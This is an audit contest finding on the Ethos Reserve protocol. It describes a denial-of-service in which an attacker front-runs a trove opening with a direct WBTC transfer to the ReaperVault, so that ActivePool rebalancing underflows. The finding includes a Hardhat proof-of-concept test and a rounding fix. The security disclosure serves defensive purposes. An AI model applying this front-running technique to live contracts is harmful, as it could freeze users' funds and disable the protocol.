## Tags

- bug
- 2 (Med Risk)
- disagree with severity
- primary issue
- satisfactory
- selected for report
- sponsor confirmed
- edited-by-warden
- M-13

# [DOS by directly transferring assets to Reaper Vault](https://github.com/code-423n4/2023-02-ethos-findings/issues/246) 

# Lines of code

https://github.com/code-423n4/2023-02-ethos/blob/main/Ethos-Core/contracts/ActivePool.sol#L251
https://github.com/code-423n4/2023-02-ethos/blob/main/Ethos-Core/contracts/ActivePool.sol#L264-L274
https://github.com/code-423n4/2023-02-ethos/blob/main/Ethos-Vault/contracts/ReaperVaultERC4626.sol#L207
https://github.com/code-423n4/2023-02-ethos/blob/main/Ethos-Vault/contracts/ReaperVaultERC4626.sol#L185


# Vulnerability details

## Impact
Attacker can DOS the protocol by directly transferring assets to the ReaperVault. This causes a DOS by underflow in the `ActivePool._rebalance` logic. All core ActivePool functionality will be disabled including all BorrowerOperations functionality and other functionality that relies on ActivePool. This essentially renders the protocol unusable until the protocol team figures out the fix, which is to directly transfer enough assets to ReaperVault to address the underflow. Even then, the attacker can just repeat the attack and make the protocol unusable once again. 

## Proof of Concept
With the below steps, an attacker can DOS the protocol:
1. A trove already exists and an initial deposit to the ReaperVault was already done by the ActivePool.
2. Bob opens a Trove using 190e3 WBTC as collateral (this could be any amount enough to satisfy the minimum borrowing amount of 90 LUSD).
3. Alice (the Attacker) frontruns Bob's openTrove transaction and transfers WBTC directly to the ReaperVault. The amount of assets transferred will be 1 + amount of assets ActivePool will deposit to the ReaperVault based on yieldingPercentage when Bob's openTrove tx is processed.
4. Due to Alice's frontrun, the below branch in `ActivePool._rebalance` will trigger during Bob's `openTrove` transaction:
```solidity
        } else if (vars.netAssetMovement < 0) {
            IERC4626(yieldGenerator[_collateral]).withdraw(uint256(-vars.netAssetMovement), address(this), address(this));
        }
```
`vars.netAssetMovement` will be -1 because of Alice's direct transfer of assets amounting to 1 + ActivePool's deposit amount. 
5. Because of Alice's direct transfer of WBTC to ReaperVault, let's say 1 Vault share is now worth 15 units of WBTC. `ReaperVaultERC4626.withdraw` converts assets to shares with some rounding up behavior and then converts those shares to assets again to get the amount withdrawn. This leads to at least 15 units of WBTC being withdrawn even though `vars.netAssetMovement = 1`. 
6. It is this difference between the amount of assets withdrawn from the ReaperVault and the accounting for total yield amount (`yieldingAmount[_collateral]`) that causes an underflow in subsequent calls to `ActivePool._rebalance`. The underflow happens here:

```solidity
# `vars.sharesToAssets` is now less than `vars.currentAllocated` and this operation will now always revert due to underflow.
# `vars.sharesToAssets` is total assets in the Vault while `vars.currentAllocated` is `yieldingAmount[_collateral]`. 
vars.profit = vars.sharesToAssets.sub(vars.currentAllocated);
```

Here is the [git diff](https://gist.githubusercontent.com/gjaldon/460741803d1cb81b7bd76d7240b4ba24/raw/45601e479353f85baa66160104aaca1a54b7a43e/ethos_reserve_dos.patch) for a test POC that shows the attack. To run the POC, do the following:

1. Copy all contents of the gist to `/tmp/changes.patch`
2. Clone the project repo and cd to the Ethos-Core directory.
3. Run `git apply /tmp/changes.patch` in the Ethos-Core directory.
4. Run `npm install` from the command line from Ethos-Core's root directory
5. Run `npx hardhat test --grep "DOS attack"`. The test should pass

The git diff is huge since it includes copying of Ethos-Vault contracts into the Ethos-Core project so they can be used within the Ethos-Core tests. The test looks like:

```js
    it("DOS attack", async () => {
      await activePool.setYieldingPercentage(collaterals[2].address, 1000, {
        from: owner,
      });
      await activePool.setYieldClaimThreshold(collaterals[2].address, 10000, {
        from: owner,
      });

      await collaterals[2].mint(alice, dec(10_000, 8));
      await collaterals[2].approve(borrowerOperations.address, dec(10_000, 8), {
        from: alice,
      });
      await collaterals[2].mint(bob, dec(10_000, 8));
      await collaterals[2].approve(borrowerOperations.address, dec(10_000, 8), {
        from: bob,
      });
      await collaterals[2].mint(carol, dec(10_000, 8));
      await collaterals[2].approve(borrowerOperations.address, dec(10_000, 8), {
        from: carol,
      });
      await lusdToken.unprotectedMint(alice, dec(100_000, 18));
      await lusdToken.unprotectedMint(bob, dec(100_000, 18));

      await priceFeed.setPrice(collaterals[2].address, dec(100_000, 18));
      const reaperVault = contracts.erc4626vaults[2];
      await reaperVault.grantRole(
        await reaperVault.DEPOSITOR(),
        activePool.address
      );

      await borrowerOperations.openTrove(
        collaterals[2].address,
        dec(190, 3),
        th._100pct,
        dec(90, 18),
        alice,
        alice,
        { from: alice }
      );

      // Alice frontruns Bob's deposit by transfering 300_001 WBTC to ReaperVault. 
      // 300_001 WBTC is 1 unit of WBTC more than the yield that is going to be
      // deposited to the ReaperVault.
      await collaterals[2].transfer(reaperVault.address, 300001, {
        from: alice,
      });

      await borrowerOperations.openTrove(
        collaterals[2].address,
        dec(3, 6),
        th._100pct,
        dec(90, 18),
        bob,
        bob,
        { from: bob }
      );

      // Protocol is now unusable
      await assertRevert(
        borrowerOperations.closeTrove(collaterals[2].address, {
          from: alice,
        })
      );

      await assertRevert(
        borrowerOperations.closeTrove(collaterals[2].address, {
          from: bob,
        })
      );

      await assertRevert(
        borrowerOperations.openTrove(
          collaterals[2].address,
          dec(190, 3),
          th._100pct,
          dec(90, 18),
          carol,
          carol,
          { from: carol }
        )
      );
    });
```


## Tools Used
Manual Review, Hardhat/Truffle, VSCode

## Recommended Mitigation Steps
Changing ReaperVaultERC4626 withdraw to round down instead of up fixes this issue. Below is the fixed code:
```solidity
    function previewWithdraw(uint256 assets) public view override returns (uint256 shares) {
        if (totalSupply() == 0 || _freeFunds() == 0) return 0;
        shares = (assets * totalSupply()) / _freeFunds();
    }
```